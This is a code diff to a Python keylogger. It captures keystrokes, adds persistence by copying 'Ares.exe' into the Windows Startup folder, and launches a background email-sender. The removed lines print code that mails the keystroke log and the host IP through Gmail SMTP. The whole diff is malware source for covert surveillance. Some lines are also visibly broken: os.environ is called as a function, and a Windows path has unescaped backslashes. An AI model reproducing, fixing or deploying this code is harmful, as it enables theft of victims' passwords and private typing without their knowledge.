@@ -12,9 +12,20 @@ import socket
 import datetime
 import sys
 from subprocess import Popen
+from threading import Thread
+import shutil
 
-p = Popen("copyfile.bat", cwd=r"")
-stdout, stderr = p.communicate()
+username = os.environ()
+shutil.copyfile('Ares.exe', "C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % (username))
+
+class MyThread(Thread):
+    def run(self):
+        os.system('emailsender.pyw')
+        pass
+
+thread = MyThread()
+thread.daemon = True
+thread.start()
 
 log_dir = ""
 
@@ -30,36 +41,3 @@ def on_press(key):
 
 with Listener(on_press=on_press) as listener:
     listener.join()
-
-    #partie EMAIL !
-if datetime.datetime.now().minute == 30 :
-    myip = socket.gethostbyname(socket.gethostname())
-    email_user = 'Votre E-mail'
-    email_send = 'Votre E-mail'
-    email_password = 'Votre Mot de Passe'
-    subject = 'Keylogger', myip
-
-    msg = MIMEMultipart()
-    msg['From'] = email_user
-    msg['To'] = email_send
-    msg['Subject'] = subject
-
-    body = 'Python Keylogger réponse.'
-    msg.attach(MIMEText(body, 'plain'))
-
-    filename='key_log.txt'
-    attachment =open(filename, 'rb')
-
-    part = MIMEBase('application', 'octet-stream')
-    part.set_payload((attachment).read())
-    encoders.encode_base64(part)
-    part.add_header('Content-Disposition', "attachment; filename= "+filename)
-
-    msg.attach(part)
-    text = msg.as_string()
-    server = smtplib.SMTP('smtp.gmail.com', 587)
-    server.starttls()
-    server.login(email_user, email_password)
-
-    server.sendmail(email_user,email_send,text)
-    server.quit()
